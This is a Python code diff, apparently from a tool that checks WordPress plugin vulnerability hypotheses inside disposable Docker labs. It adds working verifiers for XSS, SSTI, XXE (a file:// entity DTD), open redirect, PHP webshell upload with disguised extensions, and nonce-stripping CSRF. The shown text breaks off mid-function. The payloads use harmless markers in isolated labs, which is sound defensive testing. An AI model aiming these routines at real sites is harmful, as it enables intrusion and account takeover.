@@ -58,6 +58,12 @@ _CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query",
 _SQLI_HINTS = ("id", "search", "q", "query", "name", "term", "filter", "sort", "order")
 _URL_HINTS = ("url", "uri", "src", "source", "link", "feed", "webhook", "callback",
              "image", "avatar", "file_url", "endpoint")
+_XSS_HINTS = ("comment", "content", "message", "title", "name", "bio", "description", "text",
+             "value", "q", "search", "body")
+_XML_HINTS = ("xml", "feed", "data", "content", "body", "payload", "import")
+_REDIRECT_HINTS = ("redirect", "url", "return", "next", "target", "dest", "destination",
+                   "continue", "go", "out", "location")
+_FILE_UPLOAD_HINTS = ("file", "upload", "avatar", "image", "attachment", "document", "photo")
 
 
 @dataclass
@@ -255,6 +261,18 @@ class _Lab:
         r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
         return (r.stdout or "") if r.returncode == 0 else ""
 
+    def find_in_webroot(self, token: str, timeout: float = 10.0) -> Optional[str]:
+        """Busca, DENTRO del propio contenedor Apache, la ruta REAL de un fichero cuyo nombre
+        contenga `token` bajo wp-content/uploads -- usado para file-upload, donde WordPress puede
+        renombrar/sanear el nombre subido, asi que la ruta publica no se puede adivinar por
+        convencion, hay que preguntarle al propio filesystem. `token` es siempre un token nuestro
+        (hex, de _token()), nunca entrada de la hipotesis -- no hay inyeccion de shell posible."""
+        r = self.sh("exec", self.wp, "sh", "-c",
+                   f"find /var/www/html/wp-content/uploads -iname '*{token}*' -type f "
+                   f"2>/dev/null | head -1", timeout=timeout)
+        p = (r.stdout or "").strip()
+        return p or None
+
     def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
         return self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
                        "-v", f"{self.vol}:/var/www/html", *self._db_env, "--user", "33:33",
@@ -369,6 +387,62 @@ def _screenshot_failed_login(base_url: str, user: str, wrong_password: str) -> O
             return base64.b64encode(f.read()).decode("ascii")
     except Exception:
         return None
+    finally:
+        try:
+            os.unlink(out_path)
+        except OSError:
+            pass
+
+
+def _xss_render(base_url: str, endpoint: str, method: str, params: dict, cookies: list,
+                timeout_ms: int = 15000):
+    """Carga la respuesta del endpoint en un Chromium headless REAL (Playwright) -- GET navega
+    directamente con los parametros en la query, POST los manda via un formulario auto-enviado
+    (pagina data: URL, igual que haria una pagina ajena que la victima visita) -- y devuelve el
+    document.title final mas una captura de pantalla. No basta ver el payload reflejado en el
+    HTML crudo: solo si el MOTOR JS del navegador lo ejecuto de verdad el title cambia al marcador
+    que el payload pide. Devuelve (None, None) si Playwright no esta disponible o algo falla
+    (degradacion honesta, igual que _screenshot_authenticated)."""
+    try:
+        from playwright.sync_api import sync_playwright
+    except Exception:
+        return None, None
+    import base64
+    import html as _html
+    import tempfile
+    from urllib.parse import quote, urlencode
+    fd, out_path = tempfile.mkstemp(suffix=".png")
+    os.close(fd)
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
+            try:
+                ctx = browser.new_context(viewport={"width": 1280, "height": 900})
+                if cookies:
+                    ctx.add_cookies(cookies)
+                page = ctx.new_page()
+                if method == "GET":
+                    url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
+                    page.goto(url, wait_until="load", timeout=timeout_ms)
+                else:
+                    inputs = "".join(
+                        f'<input type="hidden" name="{_html.escape(str(k))}" '
+                        f'value="{_html.escape(str(v))}">' for k, v in params.items())
+                    form_html = (f'<html><body><form id="f" method="POST" '
+                                f'action="{base_url + endpoint}">{inputs}</form>'
+                                f'<script>document.getElementById("f").submit()</script>'
+                                f'</body></html>')
+                    page.goto("data:text/html," + quote(form_html), timeout=timeout_ms)
+                page.wait_for_timeout(800)
+                title = page.title()
+                page.screenshot(path=out_path, full_page=True)
+            finally:
+                browser.close()
+        with open(out_path, "rb") as f:
+            png = base64.b64encode(f.read()).decode("ascii")
+        return title, png
+    except Exception:
+        return None, None
     finally:
         try:
             os.unlink(out_path)
@@ -1310,6 +1384,672 @@ def verify_wordpress_ssrf(
                           f"'{token}' no aparecio en el log del listener interno -- el SSRF no se "
                           f"confirmo (puede que el endpoint/parametro no sean los reales, o que "
                           f"el servidor filtre URLs internas antes de seguirlas)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_xss(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, xss_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica XSS (reflejado, o almacenado cuando la propia respuesta lo renderiza de vuelta)
+    cargando la respuesta del endpoint en un Chromium headless REAL (ver _xss_render): el payload
+    pide cambiar document.title a un marcador aleatorio, y solo se marca verificado si el title
+    final del navegador coincide EXACTO con ese marcador -- prueba de EJECUCION real de JS, no de
+    que el payload simplemente aparezca en el HTML crudo de la respuesta (lo que no demuestra nada
+    por si solo, ya mucho WAF/plugin escapa el eco sin impedir que aparezca literal en la pagina).
+    Alcance: solo cubre el caso en que la MISMA respuesta a la peticion del ataque ya renderiza el
+    payload (reflejado, o almacenado-y-mostrado-de-inmediato); un XSS almacenado que solo se ve en
+    una pagina DISTINTA (p.ej. el panel del admin, en otra visita) necesitaria un segundo paso que
+    esta version no automatiza."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
+    if not xss_param:
+        res.detail = "no se identifico el parametro donde se refleja el payload"
+        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
+                               "afina 'parameters' en la hipotesis del LLM o pasalo a mano "
+                               "(xss_param_hint)")
+        return res
+
+    try:
+        from playwright.sync_api import sync_playwright  # noqa: F401
+    except Exception:
+        res.available = False
+        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
+                     "navegador real para confirmar EJECUCION, no basta ver el payload reflejado "
+                     "en el HTML crudo")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        from urllib.parse import urlsplit
+        host = urlsplit(boot.base_url).hostname or "127.0.0.1"
+        cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"}
+                  for c in boot.sub_sess.cookies]
+
+        token = _token()
+        marker = f"binoracle-xss-{token}"
+        attempts = [
+            f"<script>document.title='{marker}'</script>",
+            f"<img src=x onerror=\"document.title='{marker}'\">",
+            f"<svg onload=\"document.title='{marker}'\">",
+            f"\"><script>document.title='{marker}'</script>",
+            f"'><script>document.title='{marker}'</script>",
+            f"<body onload=\"document.title='{marker}'\">",
+        ]
+
+        m = (http_method or "GET").upper()
+        found = False
+        tried = []
+        for payload_value in attempts:
+            params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            params[xss_param] = payload_value
+            step(f"probando {m} {endpoint} con {xss_param}={payload_value!r} (navegador real)...")
+            title, png = _xss_render(boot.base_url, endpoint, m, params, cookies)
+            tried.append({"payload": payload_value, "title_resultante": title})
+            if title == marker:
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
+                     f"cambio exactamente a '{marker}'.")
+                if png:
+                    boot.shots.append({
+                        "caption_es": (f"Paso 5: XSS confirmado -- el navegador REAL ejecuto el "
+                                      f"script inyectado en '{xss_param}', cambiando document.title "
+                                      f"al marcador '{marker}' (no es texto reflejado, es codigo JS "
+                                      f"ejecutandose)."),
+                        "caption_en": (f"Step 5: XSS confirmed -- the REAL browser executed the "
+                                      f"script injected in '{xss_param}', changing document.title "
+                                      f"to the marker '{marker}' (not reflected text, actual JS "
+                                      f"running)."),
+                        "png_b64": png, "url": boot.base_url + endpoint})
+                break
+        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
+                             "login_bajo_privilegio_password": boot.sub_pass,
+                             "xss_param": xss_param, "token": token, "metodo": m,
+                             "endpoint": endpoint, "intentos": tried})
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"XSS confirmado: el navegador real EJECUTO el script inyectado en "
+                          f"{xss_param} -- document.title cambio exactamente a '{marker}', algo "
+                          f"que solo el motor JS del navegador pudo hacer, no una coincidencia de "
+                          f"texto reflejado")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
+                          f"ninguna el navegador ejecuto el script (document.title nunca cambio a "
+                          f"'{marker}') -- el XSS no se confirmo (puede que el contexto de "
+                          f"reflexion sea distinto, que haya sanitizacion real, o que el efecto "
+                          f"solo se vea en OTRA pagina que esta version no visita)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_ssti(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, ssti_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica server-side template injection con la misma idea que command injection: el payload
+    pide al motor de plantillas que CALCULE un producto de dos numeros aleatorios (sintaxis de
+    varios motores -- Jinja2/Twig {{ }}, ERB <%= %>, Velocity/Smarty ${ }, Ruby #{ }); si el
+    producto (que no aparece en ningun punto del payload enviado) sale en la respuesta, es prueba
+    de que el motor de plantillas EVALUO codigo, no que lo reflejo como texto."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS)
+    if not ssti_param:
+        res.detail = "no se identifico el parametro que llega al motor de plantillas"
+        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
+                               "plantilla; afina 'parameters' en la hipotesis del LLM o pasalo a "
+                               "mano (ssti_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
+        expected = a * b
+        attempts = [
+            f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}", f"<%= {a}*{b} %>",
+            f"{{{a}*{b}}}", f"${{{{{a}*{b}}}}}",
+        ]
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "ssti_param": ssti_param, "a": a, "b": b, "producto_esperado": expected,
+            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+        })
+
+        m = (http_method or "GET").upper()
+        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[ssti_param] = payload_value
+            step(f"probando {m} {endpoint} con {ssti_param}={payload_value!r}...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            matched = bool(pattern.search(resp.text or ""))
+            tried.append({"payload": payload_value, "status": resp.status_code,
+                         "producto_presente": matched})
+            if matched:
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: la respuesta contiene {expected} (={a}*{b}), calculado por el "
+                     f"motor de plantillas -- ese numero no aparece en el payload enviado.")
+                step("capturando pantalla: la respuesta HTTP con el producto calculado por el "
+                     "motor de plantillas (prueba final)...")
+                shot_url = (boot.base_url + endpoint
+                           + ("&" if "?" in endpoint else "?")
+                           + f"{ssti_param}={payload_value}") if m == "GET" else None
+                if shot_url:
+                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
+                           f"Paso 5: SSTI confirmada -- la respuesta contiene {expected} "
+                           f"(={a}*{b}), que solo pudo calcularse evaluando codigo en el motor de "
+                           f"plantillas, no reflejando el payload enviado.",
+                           f"Step 5: SSTI confirmed -- the response contains {expected} "
+                           f"(={a}*{b}), which could only come from the template engine "
+                           f"evaluating code, not from reflecting the sent payload.")
+                break
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
+                          f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
+                          f"EVALUARA {a}*{b} y devolviera {expected} en la respuesta -- prueba "
+                          f"inequivoca de evaluacion de codigo en servidor (el payload enviado no "
+                          f"contiene el numero {expected} en ningun punto)")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} y "
+                          f"ninguna produjo el producto esperado ({a}*{b}={expected}) en la "
+                          f"respuesta -- el SSTI no se confirmo (puede necesitar otra sintaxis de "
+                          f"motor, o el endpoint/parametro no son los reales)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_xxe(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, xml_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica XML External Entity con el mismo patron de fichero canario que path-traversal/LFI
+    (ver verify_wordpress_path_traversal): planta un secreto aleatorio en una ruta del sistema de
+    ficheros REAL del contenedor, construye una DTD externa que apunta a esa ruta con file://, y
+    confirma que el secreto EXACTO aparece en la respuesta tras mandar el XML -- no una deduccion
+    por status code o tiempo de respuesta. Prueba tanto mandar la DTD como VALOR de un parametro
+    de formulario (si la hipotesis cita uno) como mandarla como CUERPO crudo de la peticion
+    (application/xml y text/xml), que es el caso mas comun en APIs REST."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        secret = secrets.token_hex(16)
+        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
+        step(f"plantando fichero canario con un secreto aleatorio en {canary_path}...")
+        if not boot.lab.write_canary(canary_path, secret):
+            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
+            return res
+
+        xxe_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                  f'"file://{canary_path}">]><foo>&xxe;</foo>')
+        m = (http_method or "GET").upper()
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "xml_param": xml_param or "(cuerpo crudo)", "canary_path": canary_path,
+            "canary_secret": secret, "metodo": m, "endpoint": endpoint,
+        })
+
+        tried = []
+        found = False
+
+        def try_send(label, **kwargs):
+            nonlocal found
+            step(f"probando {m} {endpoint} ({label})...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
+            except Exception as e:
+                tried.append({"modo": label, "error": str(e)})
+                return
+            present = secret in (resp.text or "")
+            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
+            if present and not found:
+                found = True
+                res.evidence["modo_ganador"] = label
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
+                     f"({label}).")
+
+        if xml_param:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[xml_param] = xxe_xml
+            try_send("parametro de formulario",
+                     data=payload if m != "GET" else None,
+                     params=payload if m == "GET" else None)
+        if not found:
+            try_send("cuerpo crudo application/xml", data=xxe_xml.encode(),
+                     headers={"Content-Type": "application/xml"})
+        if not found:
+            try_send("cuerpo crudo text/xml", data=xxe_xml.encode(),
+                     headers={"Content-Type": "text/xml"})
+
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
+                          f"contiene el secreto exacto plantado en {canary_path} -- el parser XML "
+                          f"resolvio una entidad externa apuntando al sistema de ficheros real")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa y "
+                          f"ninguna devolvio el secreto plantado -- el XXE no se confirmo (puede "
+                          f"que el parser tenga resolve_external_entities desactivado, o el "
+                          f"endpoint/parametro no son los reales)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_open_redirect(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, redirect_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica open redirect mandando como valor del parametro una URL EXTERNA completa, con
+    redirects deshabilitados en el cliente (allow_redirects=False) para inspeccionar la cabecera
+    Location real sin seguirla. Se marca verificado SOLO si la respuesta es un 3xx y la cabecera
+    Location coincide EXACTA (o empieza exactamente) con la URL externa que mandamos -- no una
+    deduccion por el codigo de estado solo, que tambien aparece en redirecciones legitimas."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
+    if not redirect_param:
+        res.detail = "no se identifico el parametro que lleva la URL de destino"
+        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
+                               "lleva la URL de destino; afina 'parameters' en la hipotesis del "
+                               "LLM o pasalo a mano (redirect_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        token = _token()
+        target = f"https://binoracle-lab-redirect-{token}.invalid/pwned"
+        m = (http_method or "GET").upper()
+        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        payload[redirect_param] = target
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "redirect_param": redirect_param, "url_externa_enviada": target,
+            "metodo": m, "endpoint": endpoint,
+        })
+
+        step(f"probando {m} {endpoint} con {redirect_param}={target!r} (sin seguir redirects)...")
+        try:
+            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                               data=payload if m != "GET" else None,
+                               params=payload if m == "GET" else None, timeout=20,
+                               allow_redirects=False)
+        except Exception as e:
+            res.detail = f"la peticion fallo: {e}"
+            return res
+
+        location = resp.headers.get("Location", "")
+        res.evidence["status_code_respuesta"] = resp.status_code
+        res.evidence["location_recibida"] = location
+        confirmed = resp.status_code in (301, 302, 303, 307, 308) and location.startswith(target)
+        if confirmed:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
+                          f"{target!r} produjo un {resp.status_code} con Location="
+                          f"{location!r} -- el servidor redirige literalmente a un dominio "
+                          f"externo controlado por el atacante")
+            step(f"VERIFICADO: Location={location!r} coincide con la URL externa enviada.")
+        else:
+            res.ok = True
+            res.detail = (f"se envio {redirect_param}={target!r} pero la respuesta ({resp.status_code}"
+                          f", Location={location!r}) no redirige a la URL externa exacta -- el "
+                          f"open redirect no se confirmo")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_file_upload(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, file_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica unrestricted file upload (webshell) en dos pasos, ambos con prueba dura:
+
+    1) sube un fichero PHP disfrazado (varias combinaciones de extension: .php, .php.jpg,
+       .phtml, .php5, .pHp, .jpg.php) cuyo CONTENIDO calcula `a+b` para dos numeros aleatorios.
+    2) en vez de adivinar la URL publica (WordPress puede renombrar/sanear el nombre), se
+       pregunta DIRECTAMENTE al filesystem del contenedor (find_in_webroot) por un fichero cuyo
+       nombre contenga el token unico de ese intento, se construye su URL publica real a partir de
+       esa ruta, y se pide. Si la respuesta contiene la SUMA calculada (y no el codigo PHP fuente
+       sin ejecutar), es prueba de que el fichero subido se EJECUTA como PHP, no solo que se
+       guardo -- un servidor que solo almacena el fichero devolveria el codigo fuente literal, que
+       no contiene ese numero en ningun punto."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    file_param = file_param_hint or _pick_param(parameters, _FILE_UPLOAD_HINTS)
+    if not file_param:
+        res.detail = "no se identifico el parametro (campo de formulario) del fichero subido"
+        res.limitations.append("la verificacion de file-upload necesita saber que campo lleva el "
+                               "fichero; afina 'parameters' en la hipotesis del LLM o pasalo a "
+                               "mano (file_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        m = (http_method or "POST").upper()
+        name_templates = ["binoracle_{t}.php", "binoracle_{t}.php.jpg", "binoracle_{t}.phtml",
+                          "binoracle_{t}.php5", "binoracle_{t}.pHp", "binoracle_{t}.jpg.php"]
+        other_params = {k: v for k, v in (dict(parameters) if isinstance(parameters, dict)
+                                          else {p: "" for p in (parameters or [])}).items()
+                        if k != file_param}
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "file_param": file_param, "metodo": m, "endpoint": endpoint,
+        })
+
+        found = False
+        tried = []
+        for tmpl in name_templates:
+            token = _token()
+            fname = tmpl.format(t=token)
+            a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
+            expected = a + b
+            php_payload = f"<?php echo {a}+{b}; ?>".encode()
+            step(f"subiendo '{fname}' con {file_param} (contenido PHP que calcula {a}+{b})...")
+            try:
+                resp = boot.sub_sess.request(
+                    m, boot.base_url + endpoint, data=other_params,
+                    files={file_param: (fname, php_payload, "image/jpeg")}, timeout=20)
+            except Exception as e:
+                tried.append({"filename": fname, "error_subida": str(e)})
+                continue
+            found_path = lab.find_in_webroot(token)
+            entry = {"filename": fname, "status_subida": resp.status_code,
+                    "encontrado_en_contenedor": found_path}
+            if not found_path:
+                tried.append(entry)
+                continue
+            rel = found_path.replace("/var/www/html", "", 1)
+            candidate_url = boot.base_url + rel
+            entry["url_publica"] = candidate_url
+            step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
+            try:
+                import requests as _requests
+                r2 = _requests.get(candidate_url, timeout=15)
+            except Exception as e:
+                entry["error_peticion_directa"] = str(e)
+                tried.append(entry)
+                continue
+            pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+            executed = bool(pattern.search(r2.text or ""))
+            entry["status_peticion_directa"] = r2.status_code
+            entry["suma_esperada"] = expected
+            entry["suma_presente"] = executed
+            tried.append(entry)
+            if executed:
+                found = True
+                res.evidence["filename_ganador"] = fname
+                res.evidence["url_publica_ganadora"] = candidate_url
+                res.evidence["status_code_respuesta"] = r2.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
+                step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- el fichero "
+                     f"subido se EJECUTA como PHP, no se sirve como archivo estatico.")
+                step("capturando pantalla: la respuesta del webshell subido ejecutandose de "
+                     "verdad (prueba final)...")
+                boot.capture(boot.sub_sess, rel,
+                       f"Paso 5: FILE UPLOAD confirmado -- '{fname}' se subio y se EJECUTA como "
+                       f"PHP (devuelve {expected}={a}+{b}, calculado por el interprete, no el "
+                       f"codigo fuente sin ejecutar).",
+                       f"Step 5: FILE UPLOAD confirmed -- '{fname}' was uploaded and RUNS as "
+                       f"PHP (returns {expected}={a}+{b}, computed by the interpreter, not the "
+                       f"raw unexecuted source).")
+                break
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"FILE UPLOAD confirmado: '{res.evidence['filename_ganador']}' se subio "
+                          f"via {file_param} y, al pedirlo en {res.evidence['url_publica_ganadora']}"
+                          f", el servidor lo EJECUTO como PHP (devolvio una suma calculada por el "
+                          f"interprete, no el codigo fuente) -- prueba inequivoca de webshell, no "
+                          f"solo de que la subida fue aceptada")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de nombre/extension y ninguna "
+                          f"produjo un fichero que se ejecutara como PHP -- el file-upload no se "
+                          f"confirmo (puede que valide de verdad la extension/el tipo MIME, o el "
+                          f"campo/endpoint no sean los reales)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_csrf(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, email_param_hint: str = "", pass_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica CSRF reproduciendo la peticion de cambio de email/password que la hipotesis
+    describe, pero con el escenario classico de self-CSRF: el ADMIN se ataca a si mismo via una
+    pagina ajena que visita por error. La peticion:
+      - usa la sesion YA autenticada del propio admin (con su password ORIGINAL).
+      - quita activamente cualquier parametro cuyo nombre contenga 'nonce'/'token'/'csrf', aunque
+        la hipotesis lo citara -- queremos la peticion mas desnuda posible, para no confundir un
+        nonce correcto que colase por casualidad con una proteccion real.
+      - manda Origin/Referer de un dominio EXTERNO ficticio (simulando que vino de una pagina
+        ajena, no de wp-admin).
+    Se marca verificado SOLO si el efecto ocurrio de verdad (segundo login con la password nueva,
+    o lectura del email realmente cambiado en la base de datos) -- igual de exigente que
+    verify_wordpress_account_takeover, no un 200/302 solo."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    email_p = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
+    pass_p = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
+    if not (email_p or pass_p):
+        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
+        res.limitations.append("la verificacion de CSRF (self-targeting) necesita un parametro "
+                               "de email o de password; afina 'parameters' en la hipotesis del "
+                               "LLM o pasalos a mano")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+        if boot.admin_sess is None:
+            res.detail = ("no se pudo autenticar como admin con su password original -- no se "
+                          "puede simular el self-CSRF sin esa sesion")
+            return res
+
+        m = (http_method or "POST").upper()
+        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        for k in list(payload.keys()):
+            if any(h in k.lower() for h in ("nonce", "token", "csrf")):
+                del payload[k]
+        new_email = f"csrf-takeover-{_token()}@binoracle-lab.invalid" if email_p else None
+        new_pass = secrets.token_urlsafe(10) if pass_p else None
+        if email_p:
+            payload[email_p] = new_email
+        if pass_p:
+            payload[pass_p] = new_pass
+        id_p = _pick_param(parameters, _ID_HINTS)
+        if id_p:
+            payload[id_p] = boot.admin_id
+
+        headers = {"Origin": "https://binoracle-csrf-lab.invalid",
+                  "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
+        res.evidence.update({
+            "admin_user": boot.admin_user, "admin_password_original": boot.admin_pass,
+            "payload_forjado": payload, "origin_ficticio": headers["Origin"],
+            "metodo": m, "endpoint": endpoint,
+        })
+        step("enviando la peticion forjada -- sesion del admin, SIN nonce, con Origin/Referer de "
+             "un dominio externo ficticio...")
+        try:
